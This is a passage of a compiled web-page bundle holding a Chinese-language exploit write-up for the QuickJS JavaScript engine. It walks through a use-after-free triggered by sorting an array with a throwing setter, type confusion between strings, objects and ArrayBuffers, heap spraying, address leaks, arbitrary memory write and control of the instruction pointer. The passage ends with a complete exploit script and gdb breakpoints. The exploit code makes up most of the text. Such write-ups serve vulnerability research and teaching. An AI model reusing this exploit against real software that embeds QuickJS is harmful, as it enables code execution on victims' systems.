...\n];\n\n//通过refill_0访问该内存时，该内存类型为JSString。\n//通过refill_1访问该内存时，该内存类型为JSObject。\n//造成类型混淆\n")])])]),n("p",[a._v("创建第二个数组时，对应的gdb信息")]),a._v(" "),n("p",[a._v("//此时数组0保存第一个数组的地址(JSObject)，JSObject+56 偏移处保存着指向value的地址。")]),a._v(" "),n("p",[n("img",{attrs:{src:t(302),alt:"avatar"}})]),a._v(" "),n("p",[a._v("//重新分配JSString类型的内存。")]),a._v(" "),n("p",[a._v("(由于ASLR，地址变了，其实是上图中那个地址一致)")]),a._v(" "),n("p",[n("img",{attrs:{src:t(303),alt:"avatar"}})]),a._v(" "),n("h3",{attrs:{id:"_3-4"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-4","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.4")]),a._v(" "),n("h3",{attrs:{id:"通过类型混淆泄漏jsobject的信息"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#通过类型混淆泄漏jsobject的信息","aria-hidden":"true"}},[a._v("#")]),a._v(" 通过类型混淆泄漏JSObject的信息")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('for (var i = 0; i < 0x38; i += 4) {\n    var ptr = 0;\n    var val = \'\';\n    ptr = refill_0.slice(i, i + 4);\n\n    for (var j = 3; j >= 0; j--) {\n        var char = ptr.charCodeAt(j).toString(16);\n        if (char.length == 1)\n            char = \'0\' + char;\n        val += char;\n    }\n    val = parseInt(val, 16);\n    jsobj_leak_data[i / 4] = val;\n}\n\nvar shape = toint64(jsobj_leak_data[(24 - 0x10) / 4], jsobj_leak_data[(28 - 0x10) / 4]);\nvar prop = toint64(jsobj_leak_data[(32 - 0x10) / 4], jsobj_leak_data[(36 - 0x10) / 4]);\nvar values = toint64(jsobj_leak_data[(56 - 0x10) / 4], jsobj_leak_data[(60 - 0x10) / 4]);\n\nprint("shape @ " + shape.toString(16));\nprint("prop @ " + prop.toString(16));\nprint("values @ " + values.toString(16));\n')])])]),n("h3",{attrs:{id:"_3-5"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-5","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.5")]),a._v(" "),n("h3",{attrs:{id:"释放refill-1和refill-0之前的值，设置为jsobjects内存。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#释放refill-1和refill-0之前的值，设置为jsobjects内存。","aria-hidden":"true"}},[a._v("#")]),a._v(" 释放refill_1和refill_0之前的值，设置为JSObjects内存。")]),a._v(" "),n("h3",{attrs:{id:"refill-1、refill-0指向同一块内存"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#refill-1、refill-0指向同一块内存","aria-hidden":"true"}},[a._v("#")]),a._v(" refill_1、refill_0指向同一块内存")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("refill_1 = 0;\nrefill_1 = [0x1337, 0x1337];\n\nrefill_0 = 0;\nrefill_0 = [0x71717171];\n")])])]),n("h3",{attrs:{id:"_3-6"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-6","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.6")]),a._v(" "),n("h3",{attrs:{id:"free-refill-1内存，重新分配refill-1指向内存类型为jsarraybuffer。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#free-refill-1内存，重新分配refill-1指向内存类型为jsarraybuffer。","aria-hidden":"true"}},[a._v("#")]),a._v(" free refill_1内存，重新分配refill_1指向内存类型为jsArrayBuffer。")]),a._v(" "),n("h3",{attrs:{id:"refill-1、refill-0指向同一块内存，refill-0类型jsobject，-refill-1类型为jsarraybuffer。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#refill-1、refill-0指向同一块内存，refill-0类型jsobject，-refill-1类型为jsarraybuffer。","aria-hidden":"true"}},[a._v("#")]),a._v(" refill_1、refill_0指向同一块内存，refill_0类型JSObject， refill_1类型为jsArrayBuffer。")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("refill_1 = 0;\n// Need to free other JSObject size things as well to cause the\n// data to overlap and not the JSObject of the ArrayBuffer\nx = 0;\ny = 0;\nrefill_1 = new Uint32Array(0x48 / 4);\nrefill_1.fill(0x41414141);\n")])])]),n("p",[a._v("此时JsArrayBuffer的data地址刚好是之前那块JSObject地址，接下来通过refill_1设置JSObject的内存。")]),a._v(" "),n("p",[a._v("(由于ASLR，地址变了，其实是上图中那个地址一致)")]),a._v(" "),n("p",[n("img",{attrs:{src:t(304),alt:"avatar"}})]),a._v(" "),n("h3",{attrs:{id:"_3-7"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-7","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.7")]),a._v(" "),n("h3",{attrs:{id:"通过refill-1，设置内存的值为之前泄漏的jsobject对象的值，但是jsobject对象值的地址-0x2000，跳到堆喷可控得内存区。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#通过refill-1，设置内存的值为之前泄漏的jsobject对象的值，但是jsobject对象值的地址-0x2000，跳到堆喷可控得内存区。","aria-hidden":"true"}},[a._v("#")]),a._v(" 通过refill_1，设置内存的值为之前泄漏的JSObject对象的值，但是JSObject对象值的地址+0x2000，跳到堆喷可控得内存区。")]),a._v(" "),n("h3",{attrs:{id:"后边利用这个操作，泄漏任意地址。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#后边利用这个操作，泄漏任意地址。","aria-hidden":"true"}},[a._v("#")]),a._v(" 后边利用这个操作，泄漏任意地址。")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('jsobj_leak_data[(56 - 0x10) / 4] += 0x2000;\noverlap_addr = values + 0x2000;\n\nfor (var i = 4; i < 0x48 / 4; i++) {\n    refill_1[i] = jsobj_leak_data[i - 4];\n}\nrefill_1[0] = 0x51414141;\nrefill_1[1] = 0x00020d00;\nrefill_1[2] = 0x41414141;\nrefill_1[3] = 0x41414141;\nprint("new values @ " + overlap_addr.toString(16));\n')])])]),n("p",[a._v("此时gdb中，JSObject values的值，指向了堆喷中的地址，+56。")]),a._v(" "),n("p",[a._v("(由于ASLR，地址变了，其实是上图中那个地址一致)")]),a._v(" "),n("p",[n("img",{attrs:{src:t(305),alt:"avatar"}})]),a._v(" "),n("h3",{attrs:{id:"_3-8"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-8","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.8")]),a._v(" "),n("h3",{attrs:{id:"一开始的内存布局，堆喷、变量spray、jsobj-leak-data、x、y、master、slave"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#一开始的内存布局，堆喷、变量spray、jsobj-leak-data、x、y、master、slave","aria-hidden":"true"}},[a._v("#")]),a._v(" 一开始的内存布局，堆喷、变量spray、jsobj_leak_data、x、y、master、slave")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('spray = [];\n\njsobj_leak_data = new Uint32Array(0x38);\njsobj_leak_data.fill(0);\n\n// .slice will allocate a new JSString\nx = \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'.slice(1);\ny = \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'.slice(1);\n\nmaster = new Uint32Array(0x40);\nmaster.fill(0x31313131);\n\nslave = new Uint32Array(0x40);\nslave.fill(0x61616161);\n\nprint("starting exploit");\nprint("spraying buffers");\n\nfor (var i = 0; i < 0x400; i++) {\n    var x = new Uint32Array(0x1000 / 4);\n    x.fill(0x51515151);\n    spray.push(x);\n}\nprint("creating holes");\nfor (var i = 0; i < spray.length; i += 0x4) {\n    spray[i] = 0;\n}\n')])])]),n("h3",{attrs:{id:"_3-9"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-9","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.9")]),a._v(" "),n("h3",{attrs:{id:"此处jsobject值得地址已经指向了spray区，通过refill-0-0-操作的是之前spray值。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#此处jsobject值得地址已经指向了spray区，通过refill-0-0-操作的是之前spray值。","aria-hidden":"true"}},[a._v("#")]),a._v(" 此处JSObject值得地址已经指向了spray区，通过refill_0[0]操作的是之前spray值。")]),a._v(" "),n("h3",{attrs:{id:"在spray中找到我们刚刚修改的那个值，确定他的地址和index，后边有用"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#在spray中找到我们刚刚修改的那个值，确定他的地址和index，后边有用","aria-hidden":"true"}},[a._v("#")]),a._v(" 在spray中找到我们刚刚修改的那个值，确定他的地址和index，后边有用")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('refill_0[0] = 0x1;  //modify spray value\n\nvar overlap_buf;\nvar ovelap_index;\nfor (var i = 0; i < spray.length; i++) {\n    for (var j = 0; j < (0x1000 / 4); j++) {\n\n        if (spray[i] && spray[i][j] == 0x1) {\n            overlap_buf = spray[i];\n            overlap_index = j;\n            print("overlap found");\n            print("spray index = " + i.toString(16));\n            print("index into buffer = " + j.toString(16));\n\n        }\n    }\n}\n')])])]),n("p",[a._v("此时gdb中，通过JSObject values修改了spray数组。")]),a._v(" "),n("p",[n("img",{attrs:{src:t(306),alt:"avatar"}})]),a._v(" "),n("h3",{attrs:{id:"_3-10"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-10","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.10")]),a._v(" "),n("h3",{attrs:{id:"利用上面的操作，泄漏任意地址。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#利用上面的操作，泄漏任意地址。","aria-hidden":"true"}},[a._v("#")]),a._v(" 利用上面的操作，泄漏任意地址。")]),a._v(" "),n("h3",{attrs:{id:"在refill-0-0-处赋值为函数地址，通过overlap-buf把此处的地址读出来"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#在refill-0-0-处赋值为函数地址，通过overlap-buf把此处的地址读出来","aria-hidden":"true"}},[a._v("#")]),a._v(" 在refill_0[0]处赋值为函数地址，通过overlap_buf把此处的地址读出来")]),a._v(" "),n("h3",{attrs:{id:"可以得到parsefloat的地址、master字符串的地址、slave字符串的地址"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#可以得到parsefloat的地址、master字符串的地址、slave字符串的地址","aria-hidden":"true"}},[a._v("#")]),a._v(" 可以得到parseFloat的地址、master字符串的地址、slave字符串的地址")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('function addrof(obj) {\n    refill_0[0] = obj;\n    var ret = toint64(overlap_buf[overlap_index], overlap_buf[overlap_index + 1]);\n    refill_0[0] = 0;\n    return ret;\n}\n\n\nprint("crafting master and slave typed arrays");\nmaster_addr = addrof(master);\nslave_addr = addrof(slave);\nparseFloat_addr = addrof(parseFloat);\n\nprint("master addr = " + master_addr.toString(16));\nprint("slave addr = " + slave_addr.toString(16));\nprint("parseFloat addr = " + parseFloat_addr.toString(16));\n')])])]),n("p",[a._v("此时gdb中，此时spray数组值为master addr，通过spray把地址读出来造成任意地址泄漏。")]),a._v(" "),n("p",[n("img",{attrs:{src:t(307),alt:"avatar"}})]),a._v(" "),n("h3",{attrs:{id:"_3-11"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-11","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.11")]),a._v(" "),n("h3",{attrs:{id:"refill-0类型jsobject，-refill-1类型为arraybuffer。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#refill-0类型jsobject，-refill-1类型为arraybuffer。","aria-hidden":"true"}},[a._v("#")]),a._v(" refill_0类型JSObject， refill_1类型为ArrayBuffer。")]),a._v(" "),n("h3",{attrs:{id:"利用refill-1重新设置jsobject值得地址，让他指向master-values得地址。"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#利用refill-1重新设置jsobject值得地址，让他指向master-values得地址。","aria-hidden":"true"}},[a._v("#")]),a._v(" 利用refill_1重新设置JSObject值得地址，让他指向master->values得地址。")]),a._v(" "),n("h3",{attrs:{id:"利用refill-0设置master-values-》-slave"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#利用refill-0设置master-values-》-slave","aria-hidden":"true"}},[a._v("#")]),a._v(" 利用refill_0设置master->values ==》 slave")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v("// Point our crafted JSObject values to the address of master->values\nrefill_1[(56) / 4] = (master_addr & 0xffffffff) + 56;\nrefill_0[0] = slave;\n")])])]),n("p",[a._v("此时gdb中，master->values ==》 slave。")]),a._v(" "),n("p",[n("img",{attrs:{src:t(308),alt:"avatar"}})]),a._v(" "),n("h3",{attrs:{id:"_3-12"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-12","aria-hidden":"true"}},[a._v("#")]),a._v(" 3.12")]),a._v(" "),n("h3",{attrs:{id:"任意地址写"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#任意地址写","aria-hidden":"true"}},[a._v("#")]),a._v(" 任意地址写")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('function write64(addr, val) {\n    master[56 / 4] = (addr & 0xffffffff) >>> 0;\n    master[60 / 4] = addr / 0x100000000;\n\n    slave[0] = val & 0xffffffff;\n    slave[1] = val / 0x100000000;\n\n}\n\nprint("jumping to 0x41414141");\nwrite64(parseFloat_addr + 0x30, 0x414141414141);\nparseFloat();\n')])])]),n("p",[a._v("任意地址写\n"),n("img",{attrs:{src:t(309),alt:"avatar"}})]),a._v(" "),n("p",[a._v("控制rip地址\n"),n("img",{attrs:{src:t(310),alt:"avatar"}})]),a._v(" "),n("h2",{attrs:{id:"_0x4-exp"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x4-exp","aria-hidden":"true"}},[a._v("#")]),a._v(" 0x4 exp")]),a._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[a._v('function toint64(low, high) {\n    return low + high * 0x100000000;\n}\n\nfunction fromint64(val) {\n    return [val & 0xffffffff, val / 0x100000000];\n}\n\n// Global variables we are using\nvar a;\nvar refcopy;\nvar refill_0;\nvar refill_1;\n\nvar spray;\n\nvar jsobj_leak_data;\n\nvar x;\nvar y;\n\nvar master;\nvar slave;\nvar master_addr;\nvar slave_addr;\n\nvar test;\nvar test_addr;\nvar fake_test;\nvar test_values;\nvar test_values_read;\n\nspray = [];\n\njsobj_leak_data = new Uint32Array(0x38);\njsobj_leak_data.fill(0);\n\n// .slice will allocate a new JSString\nx = \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'.slice(1);\ny = \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'.slice(1);\n\nmaster = new Uint32Array(0x40);\nmaster.fill(0x31313131);\n\nslave = new Uint32Array(0x40);\nslave.fill(0x61616161);\n\nprint("starting exploit");\nprint("spraying buffers");\n\nfor (var i = 0; i < 0x400; i++) {\n    var x = new Uint32Array(0x1000 / 4);\n    x.fill(0x51515151);\n    spray.push(x);\n}\nprint("creating holes");\nfor (var i = 0; i < spray.length; i += 0x4) {\n    spray[i] = 0;\n}\nprint("placing target");\na = [\n    [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n        0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    ], 1, 2, 3, 4\n];\n\nprint("grabbing reference to target");\nrefcopy = a[0];\n\nprint("triggering bug");\na.__defineSetter__(3, function () {\n    throw 1;\n});\ntry {\n    a.sort(function (v) {\n        return 0;\n    });\n} catch (e) {}\n\nprint("freeing target twice and overlaping JSString and JSObject");\na[0] = 0x61616161;\nrefill_0 = \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'.slice(1);\nrefcopy = 0;\n\nrefill_1 = [0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n    0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2, 0x2,\n];\n\nprint("leaking JSObject data");\n// Parses the string into a bunch of uint32s\nfor (var i = 0; i < 0x38; i += 4) {\n    var ptr = 0;\n    var val = \'\';\n    ptr = refill_0.slice(i, i + 4);\n\n    for (var j = 3; j >= 0; j--) {\n        var char = ptr.charCodeAt(j).toString(16);\n        if (char.length == 1)\n            char = \'0\' + char;\n        val += char;\n    }\n    val = parseInt(val, 16);\n    jsobj_leak_data[i / 4] = val;\n}\n\nvar shape = toint64(jsobj_leak_data[(24 - 0x10) / 4], jsobj_leak_data[(28 - 0x10) / 4]);\nvar prop = toint64(jsobj_leak_data[(32 - 0x10) / 4], jsobj_leak_data[(36 - 0x10) / 4]);\nvar values = toint64(jsobj_leak_data[(56 - 0x10) / 4], jsobj_leak_data[(60 - 0x10) / 4]);\n\nprint("shape @ " + shape.toString(16));\nprint("prop @ " + prop.toString(16));\nprint("values @ " + values.toString(16));\n\nprint("freeing target twice and refilling with two JSObjects");\nrefill_1 = 0;\nrefill_1 = [0x1337, 0x1337];\n\n\nrefill_0 = 0;\nrefill_0 = [0x71717171];\n\nprint("freeing object again and refilling with ArrayBuffer data");\nrefill_1 = 0;\n// Need to free other JSObject size things as well to cause the\n// data to overlap and not the JSObject of the ArrayBuffer\nx = 0;\ny = 0;\nrefill_1 = new Uint32Array(0x48 / 4);\nrefill_1.fill(0x41414141);\n\nprint("crafting JSObject with values pointing to spray buffer data");\njsobj_leak_data[(56 - 0x10) / 4] += 0x2000;\noverlap_addr = values + 0x2000;\n\nfor (var i = 4; i < 0x48 / 4; i++) {\n    refill_1[i] = jsobj_leak_data[i - 4];\n}\nrefill_1[0] = 0x51414141;\nrefill_1[1] = 0x00020d00;\nrefill_1[2] = 0x41414141;\nrefill_1[3] = 0x41414141;\nprint("new values @ " + overlap_addr.toString(16));\n\nprint("finding overlap");\nrefill_0[0] = 0x1;  //modify spray value, not modify free addr\n\nvar overlap_buf;\nvar ovelap_index;\nfor (var i = 0; i < spray.length; i++) {\n    for (var j = 0; j < (0x1000 / 4); j++) {\n\n        if (spray[i] && spray[i][j] == 0x1) {\n            overlap_buf = spray[i];\n            overlap_index = j;\n            print("overlap found");\n            print("spray index = " + i.toString(16));\n            print("index into buffer = " + j.toString(16));\n\n        }\n    }\n}\n\n\nfunction addrof(obj) {\n    refill_0[0] = obj;\n    var ret = toint64(overlap_buf[overlap_index], overlap_buf[overlap_index + 1]);\n    refill_0[0] = 0;\n    return ret;\n}\n\n\nprint("crafting master and slave typed arrays");\nmaster_addr = addrof(master);\nslave_addr = addrof(slave);\nparseFloat_addr = addrof(parseFloat);\n\nprint("master addr = " + master_addr.toString(16));\nprint("slave addr = " + slave_addr.toString(16));\nprint("parseFloat addr = " + parseFloat_addr.toString(16));\n\n\nprint("setting master->values to slave addr");\n// Point our crafted JSObject values to the address of master->values\nrefill_1[(56) / 4] = (master_addr & 0xffffffff) + 56;\nrefill_0[0] = slave;\n//refill_1[(56) / 4] = overlap_addr;\n\nprint("setting up arb read/write");\n\nfunction write64(addr, val) {\n    master[56 / 4] = (addr & 0xffffffff) >>> 0;\n    master[60 / 4] = addr / 0x100000000;\n\n    slave[0] = val & 0xffffffff;\n    slave[1] = val / 0x100000000;\n\n}\n\nprint("jumping to 0x41414141");\nwrite64(parseFloat_addr + 0x30, 0x414141414141);\nparseFloat();\n\nprint("DONE");\n')])])]),n("h2",{attrs:{id:"_0x5-gdb-调试"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x5-gdb-调试","aria-hidden":"true"}},[a._v("#")]),a._v(" 0x5 gdb 调试")]),a._v(" "),n("p",[a._v("watch *0x6070000091d0")]),a._v(" "),n("p",[a._v("break quickjs.c:34719")]),a._v(" "),n("p",[a._v("break js_print")]),a._v(" "),n("p",[a._v("break quickjs.c:14852")]),a._v(" "),n("p",[a._v("p call_argc")]),a._v(" "),n("p",[a._v("x /10xg call_argv")])])}],r=t(1),s=Object(r.a)({},function(){this.$createElement;this._self._c;return this._m(0)},n,!1,null,null,null);e.default=s.exports}}]);